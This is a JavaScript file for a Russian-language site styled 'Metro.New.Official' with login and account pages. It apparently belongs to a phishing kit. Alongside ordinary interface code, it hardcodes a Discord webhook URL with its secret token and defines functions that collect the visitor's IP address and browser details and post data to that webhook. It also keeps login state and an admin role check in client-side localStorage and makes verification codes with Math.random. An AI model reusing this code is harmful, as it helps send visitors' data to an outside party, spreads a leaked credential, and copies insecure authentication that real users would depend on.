// Metro.New.Official/account.settings/assets/js/main.js

// Discord Webhook URL
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422279632643948595/iZ8ji9S-ocIRwdNqSTdK8WvzlBY-7YjrzAfgUvC9D45W3lQuFrWYhx-h2Lh3xJ5oh4Tp';

// Основные функции для всех страниц
class MetroSystem {
    constructor() {
        this.init();
    }

    // Инициализация системы
    init() {
        this.setupEventListeners();
        this.checkAuthStatus();
        this.loadUserData();
    }

    // Настройка обработчиков событий
    setupEventListeners() {
        // Глобальные обработчики
        document.addEventListener('DOMContentLoaded', () => {
            this.handlePageLoad();
        });
    }

    // Обработка загрузки страницы
    handlePageLoad() {
        this.animateElements();
        this.setupNavigation();
        this.updateUserInterface();
    }

    // Анимация элементов
    animateElements() {
        const animatedElements = document.querySelectorAll('.animate-on-load');
        animatedElements.forEach((element, index) => {
            setTimeout(() => {
                element.classList.add('animated');
            }, index * 100);
        });
    }

    // Настройка навигации
    setupNavigation() {
        const navLinks = document.querySelectorAll('a[href]');
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                this.handleNavigation(e, link);
            });
        });
    }

    // Обработка навигации
    handleNavigation(event, link) {
        // Можно добавить логирование переходов
        console.log('Navigation to:', link.href);
    }

    // Проверка статуса авторизации
    checkAuthStatus() {
        const userData = this.getUserData();
        if (userData) {
            document.body.classList.add('user-logged-in');
            this.updateUserInfo(userData);
        } else {
            document.body.classList.add('user-logged-out');
        }
    }

    // Загрузка данных пользователя
    loadUserData() {
        return this.getUserData();
    }

    // Получение данных пользователя из localStorage
    getUserData() {
        try {
            const userData = localStorage.getItem('metro_user');
            return userData ? JSON.parse(userData) : null;
        } catch (error) {
            console.error('Error loading user data:', error);
            return null;
        }
    }

    // Сохранение данных пользователя
    saveUserData(userData) {
        try {
            localStorage.setItem('metro_user', JSON.stringify(userData));
            this.updateUserInfo(userData);
            return true;
        } catch (error) {
            console.error('Error saving user data:', error);
            return false;
        }
    }

    // Обновление информации о пользователе в интерфейсе
    updateUserInfo(userData) {
        const userElements = document.querySelectorAll('[data-user-field]');
        userElements.forEach(element => {
            const field = element.getAttribute('data-user-field');
            if (userData[field]) {
                element.textContent = userData[field];
            }
        });
    }

    // Обновление интерфейса
    updateUserInterface() {
        // Обновляем статус входа/выхода
        const authButtons = document.querySelectorAll('.auth-button');
        const user = this.getUserData();

        authButtons.forEach(button => {
            if (user) {
                button.textContent = 'Профиль';
                button.href = 'account.settings/auth/profile.html';
            } else {
                button.textContent = 'Войти';
                button.href = 'account.settings/auth/enter.html';
            }
        });
    }

    // Отправка данных в Discord
    async sendToDiscord(data) {
        try {
            const response = await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            return response.ok;
        } catch (error) {
            console.error('Error sending to Discord:', error);
            return false;
        }
    }

    // Получение IP пользователя
    async getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'Неизвестно';
        }
    }

    // Получение информации о браузере
    getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = "Неизвестно";
        
        if (ua.includes("Chrome")) browser = "Chrome";
        else if (ua.includes("Firefox")) browser = "Firefox";
        else if (ua.includes("Safari")) browser = "Safari";
        else if (ua.includes("Edge")) browser = "Edge";
        
        return `${browser}, ${navigator.platform}`;
    }

    // Генерация случайного кода
    generateRandomCode(length = 6) {
        return Math.floor(Math.random() * Math.pow(10, length)).toString().padStart(length, '0');
    }

    // Валидация email
    validateEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    // Валидация пароля
    validatePassword(password) {
        return password.length >= 6;
    }

    // Показать уведомление
    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${this.getNotificationIcon(type)}"></i>
                <span>${message}</span>
            </div>
        `;

        document.body.appendChild(notification);

        // Автоматическое скрытие
        setTimeout(() => {
            notification.remove();
        }, 5000);
    }

    // Получение иконки для уведомления
    getNotificationIcon(type) {
        const icons = {
            success: 'check-circle',
            error: 'exclamation-circle',
            warning: 'exclamation-triangle',
            info: 'info-circle'
        };
        return icons[type] || 'info-circle';
    }

    // Выход из системы
    logout() {
        localStorage.removeItem('metro_user');
        window.location.href = 'account.settings/auth/enter.html';
    }

    // Проверка прав администратора
    isAdmin() {
        const userData = this.getUserData();
        return userData && userData.role === 'administrator';
    }

    // Загрузка всех пользователей (для админки)
    getAllUsers() {
        const users = [];
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.startsWith('metro_user_') || key === 'metro_user') {
                try {
                    const userData = JSON.parse(localStorage.getItem(key));
                    users.push(userData);
                } catch (e) {
                    console.error('Error parsing user data:', e);
                }
            }
        }
        return users;
    }
}

// Утилиты для работы с датами
class DateUtils {
    static formatDate(date) {
        return new Date(date).toLocaleDateString('ru-RU');
    }

    static formatDateTime(date) {
        return new Date(date).toLocaleString('ru-RU');
    }

    static getTimeAgo(date) {
        const now = new Date();
        const diff = now - new Date(date);
        
        const minutes = Math.floor(diff / 60000);
        const hours = Math.floor(diff / 3600000);
        const days = Math.floor(diff / 86400000);

        if (minutes < 1) return 'только что';
        if (minutes < 60) return `${minutes} мин назад`;
        if (hours < 24) return `${hours} ч назад`;
        return `${days} дн назад`;
    }
}

// Инициализация системы при загрузке
document.addEventListener('DOMContentLoaded', () => {
    window.metroSystem = new MetroSystem();
});

// Глобальные функции для использования в HTML
window.metroUtils = {
    logout: () => window.metroSystem.logout(),
    showNotification: (message, type) => window.metroSystem.showNotification(message, type),
    validateEmail: (email) => window.metroSystem.validateEmail(email),
    validatePassword: (password) => window.metroSystem.validatePassword(password)
};
